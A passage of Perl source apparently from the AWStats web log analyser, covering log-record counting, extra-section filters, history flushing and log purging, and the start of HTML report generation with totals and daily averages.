				  ;}      #Count accesses for sender email (kb)
				$_emails_l{ lc( $field[$pos_emails] ) } = $timerecord;
			}
			if ( $pos_emailr >= 0 && $field[$pos_emailr] ) {
				if ( $field[$pos_emailr] !~ /\@/ ) {
					$field[$pos_emailr] .= "\@$SiteDomain";
				}
				$_emailr_h{ lc( $field[$pos_emailr] ) }
				  ++;    #Count accesses for receiver email (hit)
				if ($pos_size>0){$_emailr_k{ lc( $field[$pos_emailr] ) } +=
				  int( $field[$pos_size] )
				  ;}      #Count accesses for receiver email (kb)
				$_emailr_l{ lc( $field[$pos_emailr] ) } = $timerecord;
			}
		}

		# Check cluster
		#--------------
		if ( $pos_cluster >= 0 ) {
			if ($PageBool) {
				$_cluster_p{ $field[$pos_cluster] }++;
			}    #Count accesses for page (page)
			$_cluster_h{ $field[$pos_cluster] }
			  ++;    #Count accesses for page (hit)
			if ($pos_size>0){$_cluster_k{ $field[$pos_cluster] } +=
			  int( $field[$pos_size] );}    #Count accesses for page (kb)
		}

		# Check size frequency
		#---------------------
		if ( $pos_size >= 0 ) {
				$_filesize{ GetBandwidthRange(int($field[$pos_size])) }++;
		}

		# Check request time frequency
		#-----------------------------
		if ( $pos_time >= 0 ) {
				$_requesttime{GetRequestTimeRange(int($field[$pos_time]))}++;
		}

		# Analyze: Extra
		#---------------
		foreach my $extranum ( 1 .. @ExtraName - 1 ) {
			if ($Debug) { debug( "  Process extra analyze $extranum", 4 ); }

			# Check code
			my $conditionok = 0;
			if ( $ExtraCodeFilter[$extranum] ) {
				foreach
				  my $condnum ( 0 .. @{ $ExtraCodeFilter[$extranum] } - 1 )
				{
					if ($Debug) {
						debug( "  Check code '$field[$pos_code]' must be '$ExtraCodeFilter[$extranum][$condnum]'",
							5
						);
					}
					if ( $field[$pos_code] eq
						"$ExtraCodeFilter[$extranum][$condnum]" )
					{
						$conditionok = 1;
						last;
					}
				}
				if ( !$conditionok && @{ $ExtraCodeFilter[$extranum] } ) {
					next;
				}    # End for this section
				if ($Debug) {
					debug( "  No check on code or code is OK. Now we check other conditions.",
						5
					);
				}
			}

			# Check conditions
			$conditionok = 0;
			foreach my $condnum ( 0 .. @{ $ExtraConditionType[$extranum] } - 1 )
			{
				my $conditiontype    = $ExtraConditionType[$extranum][$condnum];
				my $conditiontypeval =
				  $ExtraConditionTypeVal[$extranum][$condnum];
				if ( $conditiontype eq 'URL' ) {
					if ($Debug) {
						debug( "  Check condition '$conditiontype' must contain '$conditiontypeval' in '$urlwithnoquery'",
							5
						);
					}
					if ( $urlwithnoquery =~ /$conditiontypeval/ ) {
						$conditionok = 1;
						last;
					}
				}
				elsif ( $conditiontype eq 'QUERY_STRING' ) {
					if ($Debug) {
						debug( "  Check condition '$conditiontype' must contain '$conditiontypeval' in '$standalonequery'",
							5
						);
					}
					if ( $standalonequery =~ /$conditiontypeval/ ) {
						$conditionok = 1;
						last;
					}
				}
				elsif ( $conditiontype eq 'URLWITHQUERY' ) {
					if ($Debug) {
						debug( "  Check condition '$conditiontype' must contain '$conditiontypeval' in '$urlwithnoquery$tokenquery$standalonequery'",
							5
						);
					}
					if ( "$urlwithnoquery$tokenquery$standalonequery" =~
						/$conditiontypeval/ )
					{
						$conditionok = 1;
						last;
					}
				}
				elsif ( $conditiontype eq 'REFERER' ) {
					if ($Debug) {
						debug( "  Check condition '$conditiontype' must contain '$conditiontypeval' in '$field[$pos_referer]'",
							5
						);
					}
					if ( $field[$pos_referer] =~ /$conditiontypeval/ ) {
						$conditionok = 1;
						last;
					}
				}
				elsif ( $conditiontype eq 'UA' ) {
					if ($Debug) {
						debug( "  Check condition '$conditiontype' must contain '$conditiontypeval' in '$field[$pos_agent]'",
							5
						);
					}
					if ( $field[$pos_agent] =~ /$conditiontypeval/ ) {
						$conditionok = 1;
						last;
					}
				}
				elsif ( $conditiontype eq 'HOSTINLOG' ) {
					if ($Debug) {
						debug( "  Check condition '$conditiontype' must contain '$conditiontypeval' in '$field[$pos_host]'",
							5
						);
					}
					if ( $field[$pos_host] =~ /$conditiontypeval/ ) {
						$conditionok = 1;
						last;
					}
				}
				elsif ( $conditiontype eq 'HOST' ) {
					my $hosttouse = ( $HostResolved ? $HostResolved : $Host );
					if ($Debug) {
						debug( "  Check condition '$conditiontype' must contain '$conditiontypeval' in '$hosttouse'",
							5
						);
					}
					if ( $hosttouse =~ /$conditiontypeval/ ) {
						$conditionok = 1;
						last;
					}
				}
				elsif ( $conditiontype eq 'VHOST' ) {
					if ($Debug) {
						debug( "  Check condision '$conditiontype' must contain '$conditiontypeval' in '$field[$pos_vh]'",
							5
						);
					}
					if ( $field[$pos_vh] =~ /$conditiontypeval/ ) {
						$conditionok = 1;
						last;
					}
				}
				elsif ( $conditiontype =~ /extra(\d+)/i ) {
					if ($Debug) {
						debug( "  Check condition '$conditiontype' must contain '$conditiontypeval' in '$field[$pos_extra[$1]]'",
							5
						);
					}
					if ( $field[ $pos_extra[$1] ] =~ /$conditiontypeval/ ) {
						$conditionok = 1;
						last;
					}
				}
				else {
					error( "Wrong value of parameter ExtraSectionCondition$extranum"
					);
				}
			}
			if ( !$conditionok && @{ $ExtraConditionType[$extranum] } ) {
				next;
			}    # End for this section
			if ($Debug) {
				debug( " No condition or condition is OK. Now we extract value for first column of extra chart.",
					5
				);
			}

			# Determine actual column value to use.
			my $rowkeyval;
			my $rowkeyok = 0;
			foreach my $rowkeynum (
				0 .. @{ $ExtraFirstColumnValuesType[$extranum] } - 1 )
			{
				my $rowkeytype =
				  $ExtraFirstColumnValuesType[$extranum][$rowkeynum];
				my $rowkeytypeval =
				  $ExtraFirstColumnValuesTypeVal[$extranum][$rowkeynum];
				if ( $rowkeytype eq 'URL' ) {
					if ( $urlwithnoquery =~ /$rowkeytypeval/ ) {
						$rowkeyval = "$1";
						$rowkeyok  = 1;
						last;
					}
				}
				elsif ( $rowkeytype eq 'QUERY_STRING' ) {
					if ($Debug) {
						debug( " Extract value from '$standalonequery' with regex '$rowkeytypeval'.",
							5
						);
					}
					if ( $standalonequery =~ /$rowkeytypeval/ ) {
						$rowkeyval = "$1";
						$rowkeyok  = 1;
						last;
					}
				}
				elsif ( $rowkeytype eq 'URLWITHQUERY' ) {
					if ( "$urlwithnoquery$tokenquery$standalonequery" =~
						/$rowkeytypeval/ )
					{
						$rowkeyval = "$1";
						$rowkeyok  = 1;
						last;
					}
				}
				elsif ( $rowkeytype eq 'REFERER' ) {
					if ( $field[$pos_referer] =~ /$rowkeytypeval/ ) {
						$rowkeyval = "$1";
						$rowkeyok  = 1;
						last;
					}
				}
				elsif ( $rowkeytype eq 'UA' ) {
					if ( $field[$pos_agent] =~ /$rowkeytypeval/ ) {
						$rowkeyval = "$1";
						$rowkeyok  = 1;
						last;
					}
				}
				elsif ( $rowkeytype eq 'HOSTINLOG' ) {
					if ( $field[$pos_host] =~ /$rowkeytypeval/ ) {
						$rowkeyval = "$1";
						$rowkeyok  = 1;
						last;
					}
				}
				elsif ( $rowkeytype eq 'HOST' ) {
					my $hosttouse = ( $HostResolved ? $HostResolved : $Host );
					if ( $hosttouse =~ /$rowkeytypeval/ ) {
						$rowkeyval = "$1";
						$rowkeyok  = 1;
						last;
					}
				}
				elsif ( $rowkeytype eq 'VHOST' ) {
					if ( $field[$pos_vh] =~ /$rowkeytypeval/ ) {
						$rowkeyval = "$1";
						$rowkeyok  = 1;
						last;
					}
				}
				elsif ( $rowkeytype =~ /extra(\d+)/i ) {
					if ( $field[ $pos_extra[$1] ] =~ /$rowkeytypeval/ ) {
						$rowkeyval = "$1";
						$rowkeyok  = 1;
						last;
					}
				}
				else {
					error( "Wrong value of parameter ExtraSectionFirstColumnValues$extranum"
					);
				}
			}
			if ( !$rowkeyok ) { next; }    # End for this section
			if ( !defined($rowkeyval) ) { $rowkeyval = 'Failed to extract key'; }
			if ($Debug) { debug( "  Key val found: $rowkeyval", 5 ); }

			# Apply function on $rowkeyval
			if ( $ExtraFirstColumnFunction[$extranum] ) {

				# Todo call function on string $rowkeyval
			}

			# Here we got all values to increase counters
			if ( $PageBool && $ExtraStatTypes[$extranum] =~ /P/i ) {
				${ '_section_' . $extranum . '_p' }{$rowkeyval}++;
			}
			${ '_section_' . $extranum . '_h' }{$rowkeyval}++;    # Must be set
			if ( $ExtraStatTypes[$extranum] =~ /B/i && $pos_size>0) {
				${ '_section_' . $extranum . '_k' }{$rowkeyval} +=
				  int( $field[$pos_size] );
			}
			if ( $ExtraStatTypes[$extranum] =~ /L/i ) {
				if ( ${ '_section_' . $extranum . '_l' }{$rowkeyval}
					|| 0 < $timerecord )
				{
					${ '_section_' . $extranum . '_l' }{$rowkeyval} =
					  $timerecord;
				}
			}

			# Check to avoid too large extra sections
			if (
				scalar keys %{ '_section_' . $extranum . '_h' } >
				$ExtraTrackedRowsLimit )
			{
				error(<<END_ERROR_TEXT);
The number of values found for extra section $extranum has grown too large.
In order to prevent awstats from using an excessive amount of memory, the number
of values is currently limited to $ExtraTrackedRowsLimit. Perhaps you should consider
revising extract parameters for extra section $extranum. If you are certain you
want to track such a large data set, you can increase the limit by setting
ExtraTrackedRowsLimit in your awstats configuration file.
END_ERROR_TEXT
			}
		}

		# Every 20,000 approved lines after a flush, we test to clean too large hash arrays to flush data in tmp file
		if ( ++$counterforflushtest >= 20000 ) {

			#if (++$counterforflushtest >= 1) {
			if (   ( scalar keys %_host_u ) > ( $LIMITFLUSH << 2 )
				|| ( scalar keys %_url_p ) > $LIMITFLUSH )
			{

				# warning("Warning: Try to run AWStats update process more frequently to analyze smaler log files.");
				if ( $^X =~ /activestate/i || $^X =~ /activeperl/i ) {

				# We don't flush if perl is activestate to avoid slowing process because of memory hole
				}
				else {

					# Clean tmp hash arrays
					#%TmpDNSLookup = ();
					%TmpOS = %TmpRefererServer = %TmpRobot = %TmpBrowser = ();

					# We flush if perl is not activestate
					print "Flush history file on disk";
					if ( ( scalar keys %_host_u ) > ( $LIMITFLUSH << 2 ) ) {
						print " (unique hosts reach flush limit of "
						  . ( $LIMITFLUSH << 2 ) . ")";
					}
					if ( ( scalar keys %_url_p ) > $LIMITFLUSH ) {
						print " (unique url reach flush limit of "
						  . ($LIMITFLUSH) . ")";
					}
					print "\n";
					if ($Debug) {
						debug( "End of set of $counterforflushtest records: Some hash arrays are too large. We flush and clean some.",
							2
						);
						print " _host_p:"
						  . ( scalar keys %_host_p )
						  . " _host_h:"
						  . ( scalar keys %_host_h )
						  . " _host_k:"
						  . ( scalar keys %_host_k )
						  . " _host_l:"
						  . ( scalar keys %_host_l )
						  . " _host_s:"
						  . ( scalar keys %_host_s )
						  . " _host_u:"
						  . ( scalar keys %_host_u ) . "\n";
						print " _url_p:"
						  . ( scalar keys %_url_p )
						  . " _url_k:"
						  . ( scalar keys %_url_k )
						  . " _url_e:"
						  . ( scalar keys %_url_e )
						  . " _url_x:"
						  . ( scalar keys %_url_x ) . "\n";
						print " _waithost_e:"
						  . ( scalar keys %_waithost_e )
						  . " _waithost_l:"
						  . ( scalar keys %_waithost_l )
						  . " _waithost_s:"
						  . ( scalar keys %_waithost_s )
						  . " _waithost_u:"
						  . ( scalar keys %_waithost_u ) . "\n";
					}
					&Read_History_With_TmpUpdate(
						$lastprocessedyear,
						$lastprocessedmonth,
						$lastprocessedday,
						$lastprocessedhour,
						1,
						1,
						"all",
						( $lastlinenb + $NbOfLinesParsed ),
						$lastlineoffset,
						&CheckSum($_)
					);
					&GetDelaySinceStart(1);
					$NbOfLinesShowsteps = 1;
				}
			}
			$counterforflushtest = 0;
		}

	}    # End of loop for processing new record.

	if ($Debug) {
		debug(
			" _host_p:"
			  . ( scalar keys %_host_p )
			  . " _host_h:"
			  . ( scalar keys %_host_h )
			  . " _host_k:"
			  . ( scalar keys %_host_k )
			  . " _host_l:"
			  . ( scalar keys %_host_l )
			  . " _host_s:"
			  . ( scalar keys %_host_s )
			  . " _host_u:"
			  . ( scalar keys %_host_u ) . "\n",
			1
		);
		debug(
			" _url_p:"
			  . ( scalar keys %_url_p )
			  . " _url_k:"
			  . ( scalar keys %_url_k )
			  . " _url_e:"
			  . ( scalar keys %_url_e )
			  . " _url_x:"
			  . ( scalar keys %_url_x ) . "\n",
			1
		);
		debug(
			" _waithost_e:"
			  . ( scalar keys %_waithost_e )
			  . " _waithost_l:"
			  . ( scalar keys %_waithost_l )
			  . " _waithost_s:"
			  . ( scalar keys %_waithost_s )
			  . " _waithost_u:"
			  . ( scalar keys %_waithost_u ) . "\n",
			1
		);
		debug(
			"End of processing log file (AWStats memory cache is TmpDNSLookup="
			  . ( scalar keys %TmpDNSLookup )
			  . " TmpBrowser="
			  . ( scalar keys %TmpBrowser )
			  . " TmpOS="
			  . ( scalar keys %TmpOS )
			  . " TmpRefererServer="
			  . ( scalar keys %TmpRefererServer )
			  . " TmpRobot="
			  . ( scalar keys %TmpRobot ) . ")",
			1
		);
	}

	# Save current processed break section
	# If lastprocesseddate > 0 means there is at least one approved new record in log or at least one existing history file
	if ( $lastprocesseddate > 0 )
	{
		seek( LOG, $lastlineoffset, 0 );
		my $line = <LOG>;
		chomp $line;
		$line =~ s/\r$//;
		if ( !$NbOfLinesParsed ) 
		{
			&Read_History_With_TmpUpdate(
				$lastprocessedyear, $lastprocessedmonth,
				$lastprocessedday,  $lastprocessedhour,
				1,                  1,
				"all", ( $lastlinenb + $NbOfLinesParsed ),
				$lastlineoffset, &CheckSum($line)
			);
		}
		else {
			&Read_History_With_TmpUpdate(
				$lastprocessedyear, $lastprocessedmonth,
				$lastprocessedday,  $lastprocessedhour,
				1,                  1,
				"all", ( $lastlinenb + $NbOfLinesParsed ),
				$lastlineoffset, &CheckSum($line)
			);
		}
	}

	if ($Debug) { debug("Close log file \"$LogFile\""); }
	close LOG || error("Command for pipe '$LogFile' failed");

	# Process the Rename - Archive - Purge phase
	my $renameok  = 1;
	my $archiveok = 1;

	# Open Log file for writing if PurgeLogFile is on
	if ($PurgeLogFile) {
		if ($ArchiveLogRecords) {
			if ( $ArchiveLogRecords == 1 ) {
				$ArchiveFileName = "$DirData/${PROG}_archive$FileSuffix.log";
			}
			else {
				$ArchiveFileName =
				  "$DirData/${PROG}_archive$FileSuffix."
				  . &Substitute_Tags($ArchiveLogRecords) . ".log";
			}
			open( LOG, "+<$LogFile" ) || error( "Enable to archive log records of \"$LogFile\" into \"$ArchiveFileName\" because source can't be opened for read and write: $!<br>"
			  );
		}
		else {
			open( LOG, "+<$LogFile" );
		}
		binmode LOG;
	}

	# Rename all HISTORYTMP files into HISTORYTXT
	&Rename_All_Tmp_History();

	# Purge Log file if option is on and all renaming are ok
	if ($PurgeLogFile) {

		# Archive LOG file into ARCHIVELOG
		if ($ArchiveLogRecords) {
			if ($Debug) { debug("Start of archiving log file"); }
			open( ARCHIVELOG, ">>$ArchiveFileName" ) || error(
				"Couldn't open file \"$ArchiveFileName\" to archive log: $!");
			binmode ARCHIVELOG;
			while (<LOG>) {
				if ( !print ARCHIVELOG $_ ) { $archiveok = 0; last; }
			}
			close(ARCHIVELOG) || error("Archiving failed during closing archive: $!");
			if ($SaveDatabaseFilesWithPermissionsForEveryone) {
				chmod 0666, "$ArchiveFileName";
			}
			if ($Debug) { debug("End of archiving log file"); }
		}

		# If rename and archive ok
		if ( $renameok && $archiveok ) {
			if ($Debug) { debug("Purge log file"); }
			my $bold   = ( $ENV{'GATEWAY_INTERFACE'} ? '<b>'    : '' );
			my $unbold = ( $ENV{'GATEWAY_INTERFACE'} ? '</b>'   : '' );
			my $br     = ( $ENV{'GATEWAY_INTERFACE'} ? '<br>' : '' );
			truncate( LOG, 0 ) || warning( "Warning: $bold$PROG$unbold couldn't purge logfile \"$bold$LogFile$unbold\".$br\nChange your logfile permissions to allow write for your web server CGI process or change PurgeLogFile=1 into PurgeLogFile=0 in configure file and think to purge sometimes manually your logfile (just after running an update process to not loose any not already processed records your log file contains)."
			  );
		}
		close(LOG);
	}

	if ( $DNSLookup == 1 && $DNSLookupAlreadyDone ) {

		# DNSLookup warning
		my $bold   = ( $ENV{'GATEWAY_INTERFACE'} ? '<b>'    : '' );
		my $unbold = ( $ENV{'GATEWAY_INTERFACE'} ? '</b>'   : '' );
		my $br     = ( $ENV{'GATEWAY_INTERFACE'} ? '<br>' : '' );
		warning( "Warning: $bold$PROG$unbold has detected that some hosts names were already resolved in your logfile $bold$DNSLookupAlreadyDone$unbold.$br\nIf DNS lookup was already made by the logger (web server), you should change your setup DNSLookup=$DNSLookup into DNSLookup=0 to increase $PROG speed."
		);
	}
	if ( $DNSLookup == 1 && $NbOfNewLines ) {

		# Save new DNS last update cache file
		Save_DNS_Cache_File( \%TmpDNSLookup, "$DirData/$DNSLastUpdateCacheFile",
			"$FileSuffix" );    # Save into file using FileSuffix
	}

	if ($EnableLockForUpdate) {

		# Remove lock
		&Lock_Update(0);

		# Restore signals handler
		$SIG{INT} = 'DEFAULT';    # 2
		#$SIG{KILL} = 'DEFAULT';	# 9
		#$SIG{TERM} = 'DEFAULT';	# 15
	}

}

#---------------------------------------------------------------------
# SHOW REPORT
#---------------------------------------------------------------------

if ( scalar keys %HTMLOutput ) {

	debug( "YearRequired=$YearRequired, MonthRequired=$MonthRequired", 2 );
	debug( "DayRequired=$DayRequired, HourRequired=$HourRequired",     2 );

	# Define the NewLinkParams for main chart
	my $NewLinkParams = ${QueryString};
	$NewLinkParams =~ s/(^|&|&amp;)update(=\w*|$)//i;
	$NewLinkParams =~ s/(^|&|&amp;)output(=\w*|$)//i;
	$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\w*|$)//i;
	$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;
	my $NewLinkTarget = '';
	if ($DetailedReportsOnNewWindows) {
		$NewLinkTarget = " target=\"awstatsbis\"";
	}
	if ( ( $FrameName eq 'mainleft' || $FrameName eq 'mainright' )
		&& $DetailedReportsOnNewWindows < 2 )
	{
		$NewLinkParams .= "&amp;framename=mainright";
		$NewLinkTarget = " target=\"mainright\"";
	}
	$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
	$NewLinkParams =~ s/^&amp;//;
	$NewLinkParams =~ s/&amp;$//;
	if ($NewLinkParams) { $NewLinkParams = "${NewLinkParams}&amp;"; }

	if ( $FrameName ne 'mainleft' ) {

		# READING DATA
		#-------------
		&Init_HashArray();

		# Lecture des fichiers history / reading history file
		if ( $DatabaseBreak eq 'month' ) {
			for ( my $ix = 12 ; $ix >= 1 ; $ix-- ) {
				my $stringforload = '';
				my $monthix = sprintf( "%02s", $ix );
				if ( $MonthRequired eq 'all' || $monthix eq $MonthRequired ) {
					$stringforload = 'all';
				}
				elsif ( ( $HTMLOutput{'main'} && $ShowMonthStats )
					|| $HTMLOutput{'alldays'} )
				{ $stringforload = 'general time'; }
				if ($stringforload) { &Read_History_With_TmpUpdate( $YearRequired, $monthix, '', '', 0, 0, $stringforload ); }# On charge fichier / file is loaded
			}
		}
		if ( $DatabaseBreak eq 'day' ) {
			my $stringforload = 'all';
			my $monthix       = sprintf( "%02s", $MonthRequired );
			my $dayix         = sprintf( "%02s", $DayRequired );
			&Read_History_With_TmpUpdate( $YearRequired, $monthix, $dayix, '',
				0, 0, $stringforload );
		}
		if ( $DatabaseBreak eq 'hour' ) {
			my $stringforload = 'all';
			my $monthix       = sprintf( "%02s", $MonthRequired );
			my $dayix         = sprintf( "%02s", $DayRequired );
			my $hourix        = sprintf( "%02s", $HourRequired );
			&Read_History_With_TmpUpdate( $YearRequired, $monthix, $dayix,
				$hourix, 0, 0, $stringforload );
		}

	}

	# HTMLHeadSection
	if ( $FrameName ne 'index' && $FrameName ne 'mainleft' ) {
		print "<a name=\"top\"></a>";
		my $newhead = $HTMLHeadSection;
		$newhead =~ s/\\n/\n/g;
		print "$newhead\n";
		print "\n";
	}

	# Call to plugins' function AddHTMLBodyHeader
	foreach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLBodyHeader'} } ) {
		my $function = "AddHTMLBodyHeader_$pluginname"; &$function(); }

	my $WIDTHMENU1 = ( $FrameName eq 'mainleft' ? $FRAMEWIDTH : 150 );

	# TOP BAN
	#---------------------------------------------------------------------
	if ( $ShowMenu || $FrameName eq 'mainleft' ) {
		HTMLTopBanner($WIDTHMENU1);
	}

	# Call to plugins' function AddHTMLMenuHeader
	foreach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLMenuHeader'} } ) {
		my $function = "AddHTMLMenuHeader_$pluginname";
		&$function();
	}

	# MENU (ON LEFT IF FRAME OR TOP)
	#---------------------------------------------------------------------
	#if ( $ShowMenu || $FrameName eq 'mainleft' ) {
	#	HTMLMenu($NewLinkParams, $NewLinkTarget);
	#}

	# Call to plugins' function AddHTMLMenuFooter
	foreach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLMenuFooter'} } ) {
		my $function = "AddHTMLMenuFooter_$pluginname";
		&$function();
	}

	# Exit if left frame
	if ( $FrameName eq 'mainleft' ) {
		&html_end(0);
		exit 0;
	}

	# TotalVisits TotalUnique TotalPages TotalHits TotalBytes TotalHostsKnown TotalHostsUnknown
	$TotalUnique = $TotalVisits = $TotalPages = $TotalHits = $TotalBytes = 0;
	$TotalNotViewedPages = $TotalNotViewedHits = $TotalNotViewedBytes = 0;
	$TotalHostsKnown = $TotalHostsUnknown = 0;
	my $beginmonth = $MonthRequired;
	my $endmonth   = $MonthRequired;
	if ( $MonthRequired eq 'all' ) { $beginmonth = 1; $endmonth = 12; }
	for ( my $month = $beginmonth ; $month <= $endmonth ; $month++ ) {
		my $monthix = sprintf( "%02s", $month );
		$TotalHostsKnown += $MonthHostsKnown{ $YearRequired . $monthix } || 0;
		$TotalHostsUnknown += $MonthHostsUnknown{ $YearRequired . $monthix } || 0;
		$TotalUnique += $MonthUnique{ $YearRequired . $monthix } || 0;
		$TotalVisits += $MonthVisits{ $YearRequired . $monthix } || 0;
		$TotalPages += $MonthPages{ $YearRequired . $monthix } || 0;
		$TotalHits  += $MonthHits{ $YearRequired . $monthix }  || 0;
		$TotalBytes += $MonthBytes{ $YearRequired . $monthix } || 0;
		$TotalNotViewedPages += $MonthNotViewedPages{ $YearRequired . $monthix } || 0;
		$TotalNotViewedHits += $MonthNotViewedHits{ $YearRequired . $monthix } || 0;
		$TotalNotViewedBytes += $MonthNotViewedBytes{ $YearRequired . $monthix } || 0;
	}

	# TotalHitsErrors TotalBytesErrors
	$TotalHitsErrors  = 0;
	my $TotalBytesErrors = 0;
	foreach ( keys %_errors_h ) {
		$TotalHitsErrors  += $_errors_h{$_};
		$TotalBytesErrors += $_errors_k{$_};
	}
	if ( !$TotalEntries ) {
		foreach ( keys %_url_e ) { $TotalEntries += $_url_e{$_}; }
	}
	if ( !$TotalExits ) {
		foreach ( keys %_url_x ) { $TotalExits += $_url_x{$_}; }
	}
	if ( !$TotalBytesPages ) {
		foreach ( keys %_url_k ) { $TotalBytesPages += $_url_k{$_}; }
	}
	if ( !$TotalKeyphrases ) {
		foreach ( keys %_keyphrases ) { $TotalKeyphrases += $_keyphrases{$_}; }
	}
	if ( !$TotalKeywords ) {
		foreach ( keys %_keywords ) { $TotalKeywords += $_keywords{$_}; }
	}
	if ( !$TotalSearchEnginesPages ) {
		foreach ( keys %_se_referrals_p ) {
			$TotalSearchEnginesPages += $_se_referrals_p{$_};
		}
	}
	if ( !$TotalSearchEnginesHits ) {
		foreach ( keys %_se_referrals_h ) {
			$TotalSearchEnginesHits += $_se_referrals_h{$_};
		}
	}
	if ( !$TotalRefererPages ) {
		foreach ( keys %_pagesrefs_p ) {
			$TotalRefererPages += $_pagesrefs_p{$_};
		}
	}
	if ( !$TotalRefererHits ) {
		foreach ( keys %_pagesrefs_h ) {
			$TotalRefererHits += $_pagesrefs_h{$_};
		}
	}
	$TotalDifferentPages ||= scalar keys %_url_p;
	$TotalDifferentKeyphrases ||= scalar keys %_keyphrases;
	$TotalDifferentKeywords ||= scalar keys %_keywords;
	$TotalDifferentSearchEngines ||= scalar keys %_se_referrals_h;
	$TotalDifferentReferer ||= scalar keys %_pagesrefs_h;
	my $firstdaytocountaverage = $nowyear . $nowmonth . "01"; 
	my $firstdaytoshowtime = $nowyear . $nowmonth . "01";
	my $lastdaytocountaverage = $nowyear . $nowmonth . $nowday;
	my $lastdaytoshowtime = $nowyear . $nowmonth . "31";
	if ( $MonthRequired eq 'all' ) {
		$firstdaytocountaverage =
		  $YearRequired
		  . "0101";
	}
	if ( ( $MonthRequired ne $nowmonth && $MonthRequired ne 'all' )
		|| $YearRequired ne $nowyear )
	{
		if ( $MonthRequired eq 'all' ) {
			$firstdaytocountaverage = $YearRequired . "0101";
			$firstdaytoshowtime = $YearRequired . "1201";
			$lastdaytocountaverage = $YearRequired . "1231";
			$lastdaytoshowtime = $YearRequired . "1231";
		}
		else {
			$firstdaytocountaverage = $YearRequired . $MonthRequired . "01"; 
			$firstdaytoshowtime = $YearRequired . $MonthRequired . "01";
			$lastdaytocountaverage = $YearRequired . $MonthRequired . "31";
			$lastdaytoshowtime = $YearRequired . $MonthRequired . "31";
		}
	}
	if ($Debug) {
		debug( "firstdaytocountaverage=$firstdaytocountaverage, lastdaytocountaverage=$lastdaytocountaverage",
			1
		);
		debug( "firstdaytoshowtime=$firstdaytoshowtime, lastdaytoshowtime=$lastdaytoshowtime",
			1
		);
	}

	# Call to plugins' function AddHTMLContentHeader
	foreach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLContentHeader'} } )
		{
			if ( $ShowDomainsStats =~ /U/i ) {
				print "<th bgcolor=\"#$color_u\" width=\"80\">" . _t("Unique visitors") . "</th>\n";
			}
			if ( $ShowDomainsStats =~ /V/i ) {
				print "<th bgcolor=\"#$color_v\" width=\"80\">" . _t("Visits") . "</th>\n";
			}

			my $function = "AddHTMLContentHeader_$pluginname";
			&$function();
		}

	# Output individual frames or static pages for specific sections
	#-----------------------
	if ( scalar keys %HTMLOutput == 1 ) {

		if ( $HTMLOutput{'alldomains'} ) {
			&HTMLShowDomains();
		}
		if ( $HTMLOutput{'allhosts'} || $HTMLOutput{'lasthosts'} ) {
			&HTMLShowHosts();
		}
		if ( $HTMLOutput{'unknownip'} ) {
			&HTMLShowHostsUnknown();
		}
		if ( $HTMLOutput{'allemails'} || $HTMLOutput{'lastemails'} ) {
			&HTMLShowEmailSendersChart( $NewLinkParams, $NewLinkTarget );
			&html_end(1);
		}
		if ( $HTMLOutput{'allemailr'} || $HTMLOutput{'lastemailr'} ) {
			&HTMLShowEmailReceiversChart( $NewLinkParams, $NewLinkTarget );
			&html_end(1);
		}
		if ( $HTMLOutput{'alllogins'} || $HTMLOutput{'lastlogins'} ) {
			&HTMLShowLogins();
		}
		if ( $HTMLOutput{'allrobots'} || $HTMLOutput{'lastrobots'} ) {
			&HTMLShowRobots();
		}
		if ( $HTMLOutput{'urldetail'} || $HTMLOutput{'urlentry'} || $HTMLOutput{'urlexit'} ) {
			&HTMLShowURLDetail();
		}
		if ( $HTMLOutput{'unknownos'} ) {
			&HTMLShowOSUnknown($NewLinkTarget);
		}
		if ( $HTMLOutput{'unknownbrowser'} ) {
			&HTMLShowBrowserUnknown($NewLinkTarget);
		}
		if ( $HTMLOutput{'osdetail'} ) {
			&HTMLShowOSDetail();
		}
		if ( $HTMLOutput{'browserdetail'} ) {
			&HTMLShowBrowserDetail();
		}
		if ( $HTMLOutput{'refererse'} ) {
			&HTMLShowReferers($NewLinkTarget);
		}
		if ( $HTMLOutput{'refererpages'} ) {
			&HTMLShowRefererPages($NewLinkTarget);
		}
		if ( $HTMLOutput{'keyphrases'} ) {
			&HTMLShowKeyPhrases($NewLinkTarget);
		}
		if ( $HTMLOutput{'keywords'} ) {
			&HTMLShowKeywords($NewLinkTarget);
		}
		if ( $HTMLOutput{'downloads'} ) {
			&HTMLShowDownloads();
		}
		foreach my $code ( keys %TrapInfosForHTTPErrorCodes ) {
			if ( $HTMLOutput{"errors$code"} ) {
				&HTMLShowErrorCodes($code);
			}
		}
		# BY EXTRA SECTIONS
		#----------------------------
		HTMLShowExtraSections();
		
		if ( $HTMLOutput{'info'} ) {
			# TODO Not yet available
			print "$Center<a name=\"info\">&nbsp;</a>";
			&html_end(1);
		}

		# Print any plugins that have individual pages
		# TODO - change name, graph isn't so descriptive
		my $htmloutput = '';
		foreach my $key ( keys %HTMLOutput ) { $htmloutput = $key; }
		if ( $htmloutput =~ /^plugin_(\w+)$/ ) {
			my $pluginname = $1;
			print "$Center<a name=\"plugin_$pluginname\">&nbsp;</a>";
			my $function = "AddHTMLGraph_$pluginname";
			&$function();
			&html_end(1);
		}
	}

	# Output main page
	#-----------------
	if ( $HTMLOutput{'main'} ) {
		
		# Calculate averages
		my $max_p = 0;
		my $max_h = 0;
		my $max_k = 0;
		my $max_v = 0;
		my $average_nb = 0;
		foreach my $daycursor ($firstdaytocountaverage .. $lastdaytocountaverage )
		{
			$daycursor =~ /^(\d\d\d\d)(\d\d)(\d\d)/;
			my $year  = $1;
			my $month = $2;
			my $day   = $3;
			if ( !DateIsValid( $day, $month, $year ) ) {
				next;
			}                 # If not an existing day, go to next
			$average_nb++;    # Increase number of day used to count
			$AverageVisits += ( $DayVisits{$daycursor} || 0 );
			$AveragePages += ( $DayPages{$daycursor}  || 0 );
			$AverageHits += ( $DayHits{$daycursor}   || 0 );
			$AverageBytes += ( $DayBytes{$daycursor}  || 0 );
		}
		if ($average_nb) {
			$AverageVisits = $AverageVisits / $average_nb;
			$AveragePages = $AveragePages / $average_nb;
			$AverageHits = $AverageHits / $average_nb;
			$AverageBytes = $AverageBytes / $average_nb;
			if ( $AverageVisits > $max_v ) { $max_v = $AverageVisits; }
			#if ($average_p > $max_p) { $max_p=$average_p; }
			if ( $AverageHits > $max_h ) { $max_h = $AverageHits; }
